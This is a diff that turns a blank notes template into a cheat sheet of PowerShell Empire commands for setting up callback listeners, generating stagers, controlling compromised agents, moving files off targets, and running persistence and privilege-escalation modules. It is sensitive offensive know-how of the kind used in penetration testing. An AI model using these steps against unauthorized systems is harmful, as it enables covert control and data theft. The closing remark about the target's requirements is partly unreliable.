@@ -1,44 +1,61 @@
-# Name of the Page
+# PowerShell Empire: Basic Commands Reference
 
-## Use Case and General Information
+## Overview
 
+PowerShell Empire is a post-exploitation framework that provides agents for command and control, primarily using PowerShell.
 
----
----
-[Space]
-[Space]
-## Enumeration
+## Listener Management
 
-#####  Idea or Action Under Enumeration
-```
-code
-```
+### View Listeners
+- `listeners` – List all active listeners.
 
-#####  Idea or Action Under Enumeration
-```
-code
-```
+### Create Listener
+- `uselistener [type]` – Select a listener module.
+  - Example: `uselistener http`
+- `set Name [name]` – Set listener name.
+- `set Host http://[IP]:[PORT]` – Set callback URL.
+- `execute` – Start the listener.
 
+### Delete Listener
+- `kill [name]` – Stop and remove a listener.
 
-___
----
-[Space]
-[Space]
-## Exploitation
+## Stagers
 
+### View Stagers
+- `usestager [type]` – Use a stager module (e.g., `windows/launcher_bat`).
+- `set Listener [name]` – Link to a running listener.
+- `execute` – Generate the stager payload.
 
-#####  Idea or Action Under Exploitation
-```
-code
-```
+## Agents
 
+### View Active Agents
+- `agents` – List all active agents.
 
----
----
-[Space]
-[Space]
-## Sub Heading 4
-| column1| column2|
-|:---|:---|
-|command| Description|
-|command| Description|
+### Interact with an Agent
+- `interact [agent_name]` – Enter an agent session.
+
+### Task Agent
+Once inside an agent session:
+- `shell [command]` – Run a shell command.
+- `ps` – List processes.
+- `pwd` – Print working directory.
+- `ls` – List files.
+
+### Upload / Download
+- `upload [local]` – Upload file to the target.
+- `download [remote]` – Download file from the target.
+
+### Persistence & Priv Esc
+- `usemodule persistence/...` – Use a persistence module.
+- `usemodule privesc/...` – Use a privilege escalation module.
+- `info` – Show info about the selected module.
+- `set [option] [value]` – Set required options.
+- `execute` – Run the module.
+
+### Kill Agent
+- `kill [agent_name]` – Terminate the agent session.
+
+## Notes
+- Use `help` at any prompt to list available commands.
+- Modules are organized under categories like `recon`, `privesc`, `lateral_movement`, etc.
+- Empire requires Python and PowerShell support on the target system.
